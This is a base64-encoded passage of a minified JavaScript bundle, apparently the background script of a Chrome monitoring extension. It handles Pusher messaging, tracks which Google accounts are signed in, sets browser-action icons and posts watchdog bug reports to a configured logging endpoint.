pe3ZhciBuPW8ubWVzc2FnZV9tZXRhZGF0YVtlLnR5cGVdO2lmKG4uc2FuaXRpemUmJnMuc2FuaXRpemUobi5zYW5pdGl6ZSxlLnBheWxvYWQpLG4uc2NoZW1hKXt2YXIgcj1zLnZhbGlkYXRlKG4uc2NoZW1hLGUucGF5bG9hZCk7aWYoIXIudmFsaWQpcmV0dXJuIGkuZSgiSW52YWxpZCBtZXNzYWdlIHJlcXVlc3Q6IixyLmZvcm1hdCgpKSx2b2lkIHRoaXMuc2VuZChlLmdlbmVyYXRlX3JlcGx5KGUudHlwZSsiLnJlc3BvbnNlIix7ZXJyb3I6ci5mb3JtYXQoKX0pKX19ZWxzZSBpLmQoIk5vIG1ldGFkYXRhIGF2YWlsYWJsZSBmb3IgbWVzc2FnZSB0eXBlOiAiK2UudHlwZSk7cmV0dXJuIGUuaW5zdGFuY2VfaWQmJmUuaW5zdGFuY2VfaWQhPT1hLmluc3RhbmNlX2lkP3ZvaWQgaS5kKCJJZ25vcmluZyBtZXNzYWdlIHRhcmdldHRlZCBhdCIsZS5pbnN0YW5jZV9pZCk6dm9pZCB0aGlzLnRyaWdnZXIoImludGVyYWN0IixlLHQpfSxzZW5kOmZ1bmN0aW9uKGUpe3Rocm93IGkuZSgiQ291bGRuJ3QgZGVsaXZlcjoiLGUpLG5ldyBFcnJvcigiWW91IG11c3QgaW1wbGVtZW50IHRoaXMgbWV0aG9kIGluIGEgc3ViY2xhc3MiKX19KX0sZnVuY3Rpb24oZSx0LG4pe2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUuaXNBY3RpdmUoKT8icHJlc2VuY2UtIitlLmlkLnNwbGl0KCIiKS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJuIGUuY2hhckNvZGVBdCgwKS50b1N0cmluZygxNil9KS5qb2luKCIiKTp2b2lkIDB9ZnVuY3Rpb24gaSgpe3JldHVybiBfP186KF89bmV3IFB1c2hlcihvLnB1c2hlci5rZXkse2VuY3J5cHRlZDohMCxkaXNhYmxlRmxhc2g6ITAsZGlzYWJsZVN0YXRzOiEwLGVuYWJsZWRUcmFuc3BvcnRzOlsid3MiLCJ4aHJfc3RyZWFtaW5nIiwieGhyX3BvbGxpbmciXSxhdXRoOntwYXJhbXM6e3VzZXJfaWQ6IiIsaW5zdGFuY2VfaWQ6IiJ9fX0pLF8uY29ubmVjdGlvbi5iaW5kKCJlcnJvciIsZnVuY3Rpb24oZSl7ZS5lcnJvciYmdS5lKGUuZXJyb3Iuc3RhY2spLHUuZSgiUHVzaGVyIGNvbm5lY3Rpb24gZXJyb3I6IixlKX0pLF8uY29ubmVjdGlvbi5iaW5kKCJzdGF0ZV9jaGFuZ2UiLGZ1bmN0aW9uKGUpe3N3aXRjaChlLmN1cnJlbnQpe2Nhc2UiY29ubmVjdGluZyI6dS5pKCJQdXNoZXIgc3RhdGUgY2hhbmdlZCBmcm9tIixlLnByZXZpb3VzLCJ0byIsZS5jdXJyZW50KTticmVhaztjYXNlImNvbm5lY3RlZCI6dmFyIHQ9InVua25vd24iO3RyeXt0PV8uY29ubmVjdGlvbi5jb25uZWN0aW9uLnRyYW5zcG9ydC5uYW1lfWNhdGNoKG4pe3UuZSgiRmFpbGVkIHRvIGRldGVybWluZSB0cmFuc3BvcnQ6ICIrbil9dS5pKCJQdXNoZXIgc3RhdGUgY2hhbmdlZCBmcm9tIixlLnByZXZpb3VzLCJ0byIsZS5jdXJyZW50LCIoIix0LCIpIik7YnJlYWs7Y2FzZSJkaXNjb25uZWN0ZWQiOmQudXNlcnMuYWN0aXZlVXNlcnMoKS5sZW5ndGg/dS5lKCJQdXNoZXIgc3RhdGUgY2hhbmdlZCBmcm9tIixlLnByZXZpb3VzLCJ0byIsZS5jdXJyZW50KTp1LmkoIlB1c2hlciBzdGF0ZSBjaGFuZ2VkIGZyb20iLGUucHJldmlvdXMsInRvIixlLmN1cnJlbnQsIihubyBhY3RpdmUgdXNlcnMpIik7YnJlYWs7ZGVmYXVsdDp1LmUoIlB1c2hlciBzdGF0ZSBjaGFuZ2VkIGZyb20iLGUucHJldmlvdXMsInRvIixlLmN1cnJlbnQpfX0pLF8pfXZhciBzPW4oMTUpLG89big1KSxhPW4oMyksdT1hKCJwdXNoZXIvbWVzc2FnaW5nIiksYz1uKDE0NSksbD1uKDIyKSxkPW4oNCksaD1uKDE4KSxmPW4oMzQpLkZhaWxUcmFja2VyO2lmKG4oMTYxKSxQdXNoZXIuY2hhbm5lbF9hdXRoX3RyYW5zcG9ydD0iaGFwYXJhIixQdXNoZXIuYWN0aXZpdHlfdGltZW91dD0zNWUzLFB1c2hlci5jaGFubmVsX2F1dGhfZW5kcG9pbnQ9by5wdXNoZXIuYXV0aF9lbmRwb2ludCxQdXNoZXIuYXV0aG9yaXplcnMuaGFwYXJhPWZ1bmN0aW9uKGUsdCl7dmFyIG49ZC51c2Vycy5maWx0ZXIoZnVuY3Rpb24oZSl7cmV0dXJuIHIoZSk9PT10aGlzLmNoYW5uZWwubmFtZX0uYmluZCh0aGlzKSlbMF07biYmKHRoaXMuYXV0aE9wdGlvbnMucGFyYW1zPXt1c2VyX2lkOm4uaWQsaW5zdGFuY2VfaWQ6by5pbnN0YW5jZV9pZH0pLFB1c2hlci5hdXRob3JpemVycy5hamF4LmNhbGwodGhpcyxlLHQpfSxvLnB1c2hlciYmby5wdXNoZXIuZGVidWcpe3ZhciBwPWEoInB1c2hlci5qcyIpO1B1c2hlci5sb2c9ZnVuY3Rpb24oZSl7L3B1c2hlcjoocGluZ3xwb25nKS8udGVzdChlKXx8cC5kKGUpfX12YXIgXyxtPXMuTW9kZWwuZXh0ZW5kKHtkZWZhdWx0czp7c3RhdGU6ImNvbm5lY3RpbmcifSxpbml0aWFsaXplOmZ1bmN0aW9uKCl7dS5kKCJzdWJzY3JpYmluZyB0byBjaGFubmVsOiIsdGhpcy5pZCksdGhpcy5mYWlsVHJhY2tlcj1uZXcgZigyZTMsMS41LDZlNCk7dmFyIGU9aSgpO3RoaXMuY2hhbm5lbD1lLnN1YnNjcmliZSh0aGlzLmlkKSx0aGlzLmNoYW5uZWwuYmluZCgicHVzaGVyOnN1YnNjcmlwdGlvbl9lcnJvciIsZnVuY3Rpb24odCl7dGhpcy5zZXQoInN0YXRlIiwicmV0cnlpbmciKSx0aGlzLmZhaWxUcmFja2VyLnJlY29yZEZhaWx1cmUoKSx1LmUoInN1YnNjcmlwdGlvbiBlcnJvciAodHJ5aW5nIGFnYWluIGluICIrdGhpcy5mYWlsVHJhY2tlci5jdXJyZW50RGVsYXkvMWUzKyIgc2Vjb25kcyk6Iix0aGlzLmlkLHQpLHNldFRpbWVvdXQoZS5zdWJzY3JpYmUuYmluZChlLHRoaXMuaWQpLHRoaXMuZmFpbFRyYWNrZXIuY3VycmVudERlbGF5KX0uYmluZCh0aGlzKSksdGhpcy5jaGFubmVsLmJpbmQoInB1c2hlcjpzdWJzY3JpcHRpb25fc3VjY2VlZGVkIixmdW5jdGlvbigpe3RoaXMuc2V0KCJzdGF0ZSIsImNvbm5lY3RlZCIpLHRoaXMuZmFpbFRyYWNrZXIucmVjb3JkU3VjY2VzcygpLHUuZCgic3Vic2NyaXB0aW9uIHN1Y2Nlc3MiLHRoaXMuaWQpfS5iaW5kKHRoaXMpKSx0aGlzLmNoYW5uZWwuYmluZCgiaW50ZXJhY3QiLGZ1bmN0aW9uKGUpe3ZhciB0PWwuZnJvbV9vYmooZSk7dGhpcy50cmlnZ2VyKCJpbnRlcmFjdCIsdCx0aGlzKTsNCn0uYmluZCh0aGlzKSksdGhpcy5saXN0ZW5Ubyh0aGlzLCJyZW1vdmUiLGZ1bmN0aW9uKCl7dS5kKCJ1bnN1YnNjcmliaW5nIGZyb20gY2hhbm5lbDoiLHRoaXMuaWQpLGUudW5zdWJzY3JpYmUodGhpcy5pZCksdGhpcy5jaGFubmVsLnVuYmluZF9hbGwoKSxkZWxldGUgdGhpcy5jaGFubmVsLHRoaXMuc3RvcExpc3RlbmluZygpfSl9fSkseT1zLkNvbGxlY3Rpb24uZXh0ZW5kKHttb2RlbDptfSk7ZS5leHBvcnRzPWMuZXh0ZW5kKHtpbml0aWFsaXplOmZ1bmN0aW9uKCl7Yy5wcm90b3R5cGUuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLGFyZ3VtZW50cyksdGhpcy5jaGFubmVscz1uZXcgeSx0aGlzLmxpc3RlblRvKGQudXNlcnMsImFkZCByZW1vdmUgY2hhbmdlIix0aGlzLmFzc2VydENoYW5uZWxzKSx0aGlzLmNoYW5uZWxzLm9uKCJpbnRlcmFjdCIsZnVuY3Rpb24oZSx0KXtlLmFjayYmdGhpcy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoImFjayIpKSxkLnVzZXJzLmZvckVhY2goZnVuY3Rpb24obil7cihuKT09PXQuaWQmJnRoaXMudHJpZ2dlck1lc3NhZ2VFdmVudChlLG4pfS5iaW5kKHRoaXMpKX0uYmluZCh0aGlzKSl9LHNlbmQ6ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZS5yZXBseV90bz91LmQoInNlbmRpbmciLGUudHlwZSwibWVzc2FnZSAtIHJlcGx5IHRvIixlLnJlcGx5X3RvKTp1LmQoInNlbmRpbmciLGUudHlwZSwibWVzc2FnZSIpLGguaW50ZXJhY3RfcHVzaGVyX3NlbmQoZSx0KX0sYXNzZXJ0Q2hhbm5lbHM6ZnVuY3Rpb24oKXt2YXIgZT10aGlzLmNoYW5uZWxzO2UuZmlsdGVyKGZ1bmN0aW9uKGUpe3ZhciB0PWQudXNlcnMuZ2V0KGUuZ2V0KCJ1c2VyX2lkIikpO3JldHVybiF0fHwhdC5pc0FjdGl2ZSgpfSkuZm9yRWFjaChmdW5jdGlvbih0KXtlLnJlbW92ZSh0KX0pLGQudXNlcnMuYWN0aXZlVXNlcnMoKS5maWx0ZXIoZnVuY3Rpb24odCl7cmV0dXJuIWUuZ2V0KHIodCkpfSkuZm9yRWFjaChmdW5jdGlvbih0KXtlLmFkZCh7aWQ6cih0KSx1c2VyX2lkOnQuaWR9KX0pLGUubGVuZ3RoPyh1LmkoImhhcyBhY3RpdmUgdXNlcnMsIHB1c2hlciBjb25uZWN0aW5nIiksaSgpLmNvbm5lY3QoKSk6XyYmKHUuaSgibm8gYWN0aXZlIHVzZXJzLCBwdXNoZXIgZGlzY29ubmVjdGluZyIpLGkoKS5kaXNjb25uZWN0KCkpfX0pLGUuZXhwb3J0cy5wdXNoZXJPYmplY3Q9aX0sZnVuY3Rpb24oZSx0LG4pe2Z1bmN0aW9uIHIoKXt2YXIgZTtpZihlPWYudXNlcnMuYWN0aXZlVXNlcnMoKS5sZW5ndGg+MT8iZXJyb3IiOjE9PT1mLnVzZXJzLmFjdGl2ZVVzZXJzKCkubGVuZ3RoPyJhY3RpdmUiOiJpbmFjdGl2ZSIsYyE9PWUpc3dpdGNoKGM9ZSxjbGVhclRpbWVvdXQobCksYyl7Y2FzZSJlcnJvciI6Y2hyb21lLmJyb3dzZXJBY3Rpb24uc2V0VGl0bGUoe3RpdGxlOmNocm9tZS5pMThuLmdldE1lc3NhZ2UoImJyb3dzZXJJY29uTXVsdGlwbGVVc2VycyIpfSk7dmFyIHQ9MCxuPWZ1bmN0aW9uKCl7dD03PT09dD8xOnQrMTt2YXIgZT10O2U+NCYmZS0tLGNocm9tZS5icm93c2VyQWN0aW9uLnNldEljb24oe3BhdGg6Imljb25zL2ljb24zOC1lcnJvci0iK2UrIi5wbmcifSl9O24oKSxsPXNldEludGVydmFsKG4sMjUwKTticmVhaztjYXNlImFjdGl2ZSI6Y2hyb21lLmJyb3dzZXJBY3Rpb24uc2V0SWNvbih7cGF0aDoiaWNvbnMvaWNvbjM4LWFjdGl2ZS5wbmcifSksY2hyb21lLmJyb3dzZXJBY3Rpb24uc2V0VGl0bGUoe3RpdGxlOmNocm9tZS5pMThuLmdldE1lc3NhZ2UoImJyb3dzZXJJY29uQWN0aXZlIil9KTticmVhaztjYXNlImluYWN0aXZlIjpjaHJvbWUuYnJvd3NlckFjdGlvbi5zZXRJY29uKHtwYXRoOiJpY29ucy9pY29uMzgtaW5hY3RpdmUucG5nIn0pLGNocm9tZS5icm93c2VyQWN0aW9uLnNldFRpdGxlKHt0aXRsZTpjaHJvbWUuaTE4bi5nZXRNZXNzYWdlKCJicm93c2VySWNvbkluYWN0aXZlIil9KX19ZnVuY3Rpb24gaSgpe3ZhciBlPXYuZ2V0VGFyZ2V0VXNlcnMoKSx0PUpTT04uc3RyaW5naWZ5KGYudXNlcnMucGx1Y2soImlkIikuc29ydCgpKTtkLmhhc2hfdXNlcl9pZHMmJihlPWUubWFwKGZ1bmN0aW9uKGUpe3JldHVybiBfKGUpfSkpLGUuZm9yRWFjaChmdW5jdGlvbihlKXtmLnVzZXJzLmdldChlKXx8Zi51c2Vycy5hZGQoe2lkOmV9KX0pO3ZhciBuPWYudXNlcnMuZmlsdGVyKGZ1bmN0aW9uKHQpe3JldHVybi0xPT09ZS5pbmRleE9mKHQuaWQpfSk7bi5mb3JFYWNoKGZ1bmN0aW9uKGUpe2YudXNlcnMucmVtb3ZlKGUpfSk7dmFyIHI9SlNPTi5zdHJpbmdpZnkoZi51c2Vycy5wbHVjaygiaWQiKS5zb3J0KCkpO3QhPT1yJiZwLmF1ZGl0KCJ1c2Vycy51cGRhdGVkIix2LnRvSlNPTigpKX1mdW5jdGlvbiBzKCl7cmV0dXJuIG5ldyBtKGZ1bmN0aW9uKGUsdCl7cmV0dXJuIHdpbmRvdy5uYXZpZ2F0b3Iub25MaW5lP2goe21ldGhvZDoiZ2V0Iix1cmw6ZC51c2VyX2NoZWNrX3VybCxyZXRyeUNvdW50OjMscmV0cnlJbml0aWFsRGVsYXk6MSxvblJldHJ5OmZ1bmN0aW9uKGUsdCxuKXtwLncoIkZhaWxlZCB0byBmZXRjaCB1c2VyIElEcywgcmV0cnlpbmcgaW4gIituKyIgc2Vjb25kcyAoIixlLCIpIil9LG9uU3VjY2VzczpmdW5jdGlvbih0KXt2YXIgbj1bXS5jb25jYXQoZi5nbG9iYWxDb25maWcuZ2V0KCJ1c2VyX3JlZ2V4cHMiKS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJuIG5ldyBSZWdFeHAoZSwiaWciKX0pKTtuLmxlbmd0aHx8KG49W25ldyBSZWdFeHAoLyhbYS16MC05ISMkJSYnKitcLz0/Xl9ge3x9fi1dKyg/OlwuW2EtejAtOSEjJCUmJyorXC89P15fYHt8fX4tXSspKkAoPzpbYS16MC05XSg/OlthLXowLTktXSpbYS16MC05XSk/XC4pK1thLXowLTldKD86W2EtejAtOS1dKlthLXowLTldKT8pL2dpKV0pO3ZhciByPVtdO24uZm9yRWFjaChmdW5jdGlvbihlKXtmb3IodmFyIG47bnVsbCE9PShuPWUuZXhlYyh0LnRleHQpKTspbiYmMj09PW4ubGVuZ3RoJiZyLnB1c2goblsxXSl9KSx2LnNldCh7Z29vZ2xlX3VzZXJzOnkudW5pcShyKX0pLGkoKSxlKHIpfSxvbkZhaWx1cmU6ZnVuY3Rpb24oZSl7dCgicmVxdWVzdCBlcnJvcjoiK2UpfX0pOihwLmQoIlNraXBwaW5nIGZldGNoVXNlcklkcyAoZHVlIHRvIG9mZmxpbmUpIiksdCgiU2tpcHBpbmcgZmV0Y2hVc2VySWRzIChkdWUgdG8gb2ZmbGluZSkiKSl9KX1mdW5jdGlvbiBvKGUpe3JldHVybiBlLnVybC5tYXRjaCgvXC4oZ29vZ2xlfHlvdXR1YmUpXC4vKT8ocC5kKCJMb2dvdXQgZXZlbnQ6IixlKSx2LnNldCh7Z29vZ2xlX3VzZXJzOltdfSksdm9pZCBpKCkpOnZvaWQgcC5kKCJMb2dvdXQgZXZlbnQgKG9uIHVua25vd24gZG9tYWluKToiLGUpfWZ1bmN0aW9uIGEoZSl7cmV0dXJuIGUudXJsLm1hdGNoKC9cLihnb29nbGV8eW91dHViZSlcLi8pPyhwLmQoIkxvZ2luIGV2ZW50OiIsZSksY2xlYXJUaW1lb3V0KHUpLHZvaWQodT1zZXRUaW1lb3V0KHMsMWUzKSkpOnZvaWQgcC5kKCJMb2dpbiBldmVudCAob24gdW5rbm93biBkb21haW4pOiIsZSl9dmFyIHUsYyxsLGQ9big1KSxoPW4oMTkpLGY9big0KSxwPW4oMykoInVzZXItbW9uaXRvcmluZyIpLF89bigxNzEpLG09bigxMSkseT1uKDgpLGc9bigzMyksdj1uZXcgZy5Vc2VyTW9uaXRvcmluZ1N0YXRlO2YudXNlcnMub24oImFkZCByZW1vdmUgY2hhbmdlIixyKTt2YXIgYj1uZXcgbShmdW5jdGlvbihlKXtzKCkudGhlbihmdW5jdGlvbigpe2UoKSxyKCl9LGZ1bmN0aW9uKCl7ZSgpLHIoKX0pfSk7aWYoc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXtzKCkudGhlbihmdW5jdGlvbigpe30sZnVuY3Rpb24oKXt9KX0sZC51c2VyX2NoZWNrX2ludGVydmFsKSxjaHJvbWUud2ViUmVxdWVzdC5vbkNvbXBsZXRlZC5hZGRMaXN0ZW5lcihvLHt1cmxzOlsiKjovLyovYWNjb3VudHMvQ2xlYXJTSUQqIiwiKjovLyovYWNjb3VudHMvTG9nb3V0KiJdfSksY2hyb21lLndlYlJlcXVlc3Qub25CZWZvcmVSZWRpcmVjdC5hZGRMaXN0ZW5lcihvLHt1cmxzOlsiKjovLyovYWNjb3VudHMvQ2xlYXJTSUQqIiwiKjovLyovYWNjb3VudHMvTG9nb3V0KiJdfSksY2hyb21lLndlYlJlcXVlc3Qub25Db21wbGV0ZWQuYWRkTGlzdGVuZXIoYSx7dXJsczpbIio6Ly8qL2FjY291bnRzL1NldFNJRCoiLCIqOi8vKi9hY2NvdW50cy9Db250aW51ZVNpZ25JbioiLCIqOi8vKi9TZXJ2aWNlTG9naW5BdXRoIl19KSxjaHJvbWUud2ViUmVxdWVzdC5vbkJlZm9yZVJlZGlyZWN0LmFkZExpc3RlbmVyKGEse3VybHM6WyIqOi8vKi9hY2NvdW50cy9TZXRTSUQqIiwiKjovLyovYWNjb3VudHMvQ29udGludWVTaWduSW4qIiwiKjovLyovU2VydmljZUxvZ2luQXV0aCJdfSksZS5leHBvcnRzPXtyZWFkeTpiLHN0YXRlOnZ9LGNocm9tZS5pZGVudGl0eSYmY2hyb21lLmlkZW50aXR5LmdldFByb2ZpbGVVc2VySW5mbyl7dmFyIE09ZnVuY3Rpb24oKXtjaHJvbWUuaWRlbnRpdHkuZ2V0UHJvZmlsZVVzZXJJbmZvKGZ1bmN0aW9uKGUpe2QuaGFzaF91c2VyX2lkcyYmZS5lbWFpbCYmKGUuZW1haWw9XyhlLmVtYWlsKSksdi5zZXQoe3Byb2ZpbGVfZW1haWw6ZS5lbWFpbCxwcm9maWxlX2lkOmUuaWR9KSxpKCksYi50aGVuKGZ1bmN0aW9uKCl7cC5hdWRpdCgidXNlcnMuaWRlbnRpdHkiLGUpfSl9KX07Y2hyb21lLmlkZW50aXR5Lm9uU2lnbkluQ2hhbmdlZC5hZGRMaXN0ZW5lcihNKSxNKCl9fSxmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSx0KXtpZighbig1KS5sb2dfdXJsKXJldHVybiB2b2lkIGNvbnNvbGUuZXJyb3IoIk5vIGxvZ191cmwgc2V0IHRvIHJlcG9ydCBidWcgdG8iKTtpZighd2luZG93Lm5hdmlnYXRvci5vbkxpbmUpcmV0dXJuIHZvaWQgY29uc29sZS5sb2coIlNraXBwaW5nIHdhdGNoZG9nIGJ1ZyByZXBvcnQgZHVlIHRvIG9mZmxpbmUgYnJvd3NlciIpO3ZhciByPXtwbGF0Zm9ybTp3aW5kb3cubmF2aWdhdG9yLnBsYXRmb3JtLHVzZXJBZ2VudDp3aW5kb3cubmF2aWdhdG9yLnVzZXJBZ2VudCxtZXNzYWdlOmUsZXJyb3JzOltdfTt0cnl7ci5jb25maWc9SlNPTi5wYXJzZShKU09OLnN0cmluZ2lmeShuKDUpKSl9Y2F0Y2gobyl7ci5lcnJvcnMucHVzaCgiRmFpbGVkIHRvIGZldGNoIGNvbmZpZyBpbmZvcm1hdGlvbjogIitvKX10cnl7ci51c2Vycz1uKDQpLnVzZXJzLnBsdWNrKCJpZCIpfWNhdGNoKG8pe3IuZXJyb3JzLnB1c2goIkZhaWxlZCB0byBmZXRjaCB1c2VyIGluZm9ybWF0aW9uOiAiK28pfXRyeXtyLmxvZz1KU09OLnBhcnNlKEpTT04uc3RyaW5naWZ5KG4oMykuaGlzdG9yeSkpfWNhdGNoKG8pe3IuZXJyb3JzLnB1c2goIkZhaWxlZCB0byBmZXRjaCBsb2cgaW5mb3JtYXRpb246ICIrbyl9c3x8aSh7bWV0aG9kOiJwb3N0Iix1cmw6big1KS5sb2dfdXJsKyIvYnVnLXJlcG9ydCIsZGF0YTpyLG9uU3VjY2VzczpmdW5jdGlvbigpe3M9ITAsdCE9PSExJiZzZXRUaW1lb3V0KHdpbmRvdy5sb2NhdGlvbi5yZWxvYWQuYmluZCh3aW5kb3cubG9jYXRpb24pLDZlNSl9LG9uRmFpbHVyZTpmdW5jdGlvbihlLHQpe24oMykoIndhdGNoZG9nIikuZSgiRmFpbGVkIHRvIGJ1ZyByZXBvcnQ6IixlfHx0LmVycm9yKSxzZXRUaW1lb3V0KHdpbmRvdy5sb2NhdGlvbi5yZWxvYWQuYmluZCh3aW5kb3cubG9jYXRpb24pLDZlNSl9fSl9dmFyIGk9bigxOSkscz0hMSxvPWNocm9tZS5leHRlbnNpb24uZ2V0QmFja2dyb3VuZFBhZ2UoKT09PXdpbmRvdztpZihvKXt2YXIgYT1zZXRUaW1lb3V0KHIuYmluZCh0aGlzLCJBcHAgbm90IHN0YXJ0ZWQgYWZ0ZXIgMzAgc2Vjb25kcyIpLDNlNCk7c2V0VGltZW91dChmdW5jdGlvbigpe3RyeXtuKDQpLnJlYWR5LnRoZW4oZnVuY3Rpb24oKXtjbGVhclRpbWVvdXQoYSl9KX1jYXRjaChlKXtyKCJGYWlsZWQgdG8gbGlzdGVuIGZvciBhcHAgc3RhcnRpbmciKSxjbGVhclRpbWVvdXQoYSl9fSwxZTQpfWUuZXhwb3J0cz17cmVwb3J0OnJ9fSxmdW5jdGlvbihlLHQsbil7dmFyIHIsaTsoZnVuY3Rpb24obixzLG8pew0KLyogcHVzaGVyLmpzIGZ1bmN0aW9ucyAtLT4gKi8NCg0KLyogPCEtLSBhcHAgbmV0d29ya2luZyAmIGxvZ2dpbmcgKHdoaWNoIHdlIG1heSB3YW50IHRvIHR1cm4gb2ZmKSAqLw0KIWZ1bmN0aW9uKCl7ZnVuY3Rpb24gYSgpe31mdW5jdGlvbiB1KGUpe3JldHVybiBlfWZ1bmN0aW9uIGMoZSl7cmV0dXJuISFlfWZ1bmN0aW9uIGwoZSl7cmV0dXJuIWV9ZnVuY3Rpb24gZChlKXtyZXR1cm4gZnVuY3Rpb24oKXtpZihudWxsPT09ZSl0aHJvdyBuZXcgRXJyb3IoIkNhbGxiYWNrIHdhcyBhbHJlYWR5IGNhbGxlZC4iKTtlLmFwcGx5KHRoaXMsYXJndW1lbnRzKSxlPW51bGx9fWZ1bmN0aW9uIGgoZSl7cmV0dXJuIGZ1bmN0aW9uKCl7bnVsbCE9PWUmJihlLmFwcGx5KHRoaXMsYXJndW1lbnRzKSxlPW51bGwpfX1mdW5jdGlvbiBmKGUpe3JldHVybiB6KGUpfHwibnVtYmVyIj09dHlwZW9mIGUubGVuZ3RoJiZlLmxlbmd0aD49MCYmZS5sZW5ndGglMT09PTB9ZnVuY3Rpb24gcChlLHQpe2Zvcih2YXIgbj0tMSxyPWUubGVuZ3RoOysrbjxyOyl0KGVbbl0sbixlKX1mdW5jdGlvbiBfKGUsdCl7Zm9yKHZhciBuPS0xLHI9ZS5sZW5ndGgsaT1BcnJheShyKTsrK248cjspaVtuXT10KGVbbl0sbixlKTtyZXR1cm4gaX1mdW5jdGlvbiBtKGUpe3JldHVybiBfKEFycmF5KGUpLGZ1bmN0aW9uKGUsdCl7cmV0dXJuIHR9KX1mdW5jdGlvbiB5KGUsdCxuKXtyZXR1cm4gcChlLGZ1bmN0aW9uKGUscixpKXtuPXQobixlLHIsaSl9KSxufWZ1bmN0aW9uIGcoZSx0KXtwKEooZSksZnVuY3Rpb24obil7dChlW25dLG4pfSl9ZnVuY3Rpb24gdihlLHQpe2Zvcih2YXIgbj0wO248ZS5sZW5ndGg7bisrKWlmKGVbbl09PT10KXJldHVybiBuO3JldHVybi0xfWZ1bmN0aW9uIGIoZSl7dmFyIHQsbixyPS0xO3JldHVybiBmKGUpPyh0PWUubGVuZ3RoLGZ1bmN0aW9uKCl7cmV0dXJuIHIrKyx0PnI/cjpudWxsfSk6KG49SihlKSx0PW4ubGVuZ3RoLGZ1bmN0aW9uKCl7cmV0dXJuIHIrKyx0PnI/bltyXTpudWxsfSl9ZnVuY3Rpb24gTShlLHQpe3JldHVybiB0PW51bGw9PXQ/ZS5sZW5ndGgtMTordCxmdW5jdGlvbigpe2Zvcih2YXIgbj1NYXRoLm1heChhcmd1bWVudHMubGVuZ3RoLXQsMCkscj1BcnJheShuKSxpPTA7bj5pO2krKylyW2ldPWFyZ3VtZW50c1tpK3RdO3N3aXRjaCh0KXtjYXNlIDA6cmV0dXJuIGUuY2FsbCh0aGlzLHIpO2Nhc2UgMTpyZXR1cm4gZS5jYWxsKHRoaXMsYXJndW1lbnRzWzBdLHIpfX19ZnVuY3Rpb24gTChlKXtyZXR1cm4gZnVuY3Rpb24odCxuLHIpe3JldHVybiBlKHQscil9fWZ1bmN0aW9uIGsoZSl7cmV0dXJuIGZ1bmN0aW9uKHQsbixyKXtyPWgocnx8YSksdD10fHxbXTt2YXIgaT1iKHQpO2lmKDA+PWUpcmV0dXJuIHIobnVsbCk7dmFyIHM9ITEsbz0wLHU9ITE7IWZ1bmN0aW9uIGMoKXtpZihzJiYwPj1vKXJldHVybiByKG51bGwpO2Zvcig7ZT5vJiYhdTspe3ZhciBhPWkoKTtpZihudWxsPT09YSlyZXR1cm4gcz0hMCx2b2lkKDA+PW8mJnIobnVsbCkpO28rPTEsbih0W2FdLGEsZChmdW5jdGlvbihlKXtvLT0xLGU/KHIoZSksdT0hMCk6YygpfSkpfX0oKX19ZnVuY3Rpb24gdyhlKXtyZXR1cm4gZnVuY3Rpb24odCxuLHIpe3JldHVybiBlKEkuZWFjaE9mLHQsbixyKX19ZnVuY3Rpb24gVChlKXtyZXR1cm4gZnVuY3Rpb24odCxuLHIsaSl7cmV0dXJuIGUoayhuKSx0LHIsaSl9fWZ1bmN0aW9uIFkoZSl7cmV0dXJuIGZ1bmN0aW9uKHQsbixyKXtyZXR1cm4gZShJLmVhY2hPZlNlcmllcyx0LG4scil9fWZ1bmN0aW9uIEQoZSx0LG4scil7cj1oKHJ8fGEpLHQ9dHx8W107dmFyIGk9Zih0KT9bXTp7fTtlKHQsZnVuY3Rpb24oZSx0LHIpe24oZSxmdW5jdGlvbihlLG4pe2lbdF09bixyKGUpfSl9LGZ1bmN0aW9uKGUpe3IoZSxpKX0pfWZ1bmN0aW9uIFMoZSx0LG4scil7dmFyIGk9W107ZSh0LGZ1bmN0aW9uKGUsdCxyKXtuKGUsZnVuY3Rpb24obil7biYmaS5wdXNoKHtpbmRleDp0LHZhbHVlOmV9KSxyKCl9KX0sZnVuY3Rpb24oKXtyKF8oaS5zb3J0KGZ1bmN0aW9uKGUsdCl7cmV0dXJuIGUuaW5kZXgtdC5pbmRleH0pLGZ1bmN0aW9uKGUpe3JldHVybiBlLnZhbHVlfSkpfSl9ZnVuY3Rpb24geChlLHQsbixyKXtTKGUsdCxmdW5jdGlvbihlLHQpe24oZSxmdW5jdGlvbihlKXt0KCFlKX0pfSxyKX1mdW5jdGlvbiBqKGUsdCxuKXtyZXR1cm4gZnVuY3Rpb24ocixpLHMsbyl7ZnVuY3Rpb24gYSgpe28mJm8obighMSx2b2lkIDApKX1mdW5jdGlvbiB1KGUscixpKXtyZXR1cm4gbz92b2lkIHMoZSxmdW5jdGlvbihyKXtvJiZ0KHIpJiYobyhuKCEwLGUpKSxvPXM9ITEpLGkoKX0pOmkoKX1hcmd1bWVudHMubGVuZ3RoPjM/ZShyLGksdSxhKToobz1zLHM9aSxlKHIsdSxhKSl9fWZ1bmN0aW9uIEgoZSx0KXtyZXR1cm4gdH1mdW5jdGlvbiBQKGUsdCxuKXtuPW58fGE7dmFyIHI9Zih0KT9bXTp7fTtlKHQsZnVuY3Rpb24oZSx0LG4pe2UoTShmdW5jdGlvbihlLGkpe2kubGVuZ3RoPD0xJiYoaT1pWzBdKSxyW3RdPWksbihlKX0pKX0sZnVuY3Rpb24oZSl7bihlLHIpfSl9ZnVuY3Rpb24gRShlLHQsbixyKXt2YXIgaT1bXTtlKHQsZnVuY3Rpb24oZSx0LHIpe24oZSxmdW5jdGlvbihlLHQpe2k9aS5jb25jYXQodHx8W10pLHIoZSl9KX0sZnVuY3Rpb24oZSl7cihlLGkpfSl9ZnVuY3Rpb24gRihlLHQsbil7ZnVuY3Rpb24gcihlLHQsbixyKXtpZihudWxsIT1yJiYiZnVuY3Rpb24iIT10eXBlb2Ygcil0aHJvdyBuZXcgRXJyb3IoInRhc2sgY2FsbGJhY2sgbXVzdCBiZSBhIGZ1bmN0aW9uIik7cmV0dXJuIGUuc3RhcnRlZD0hMCx6KHQpfHwodD1bdF0pLDA9PT10Lmxlbmd0aCYmZS5pZGxlKCk/SS5zZXRJbW1lZGlhdGUoZnVuY3Rpb24oKXtlLmRyYWluKCl9KToocCh0LGZ1bmN0aW9u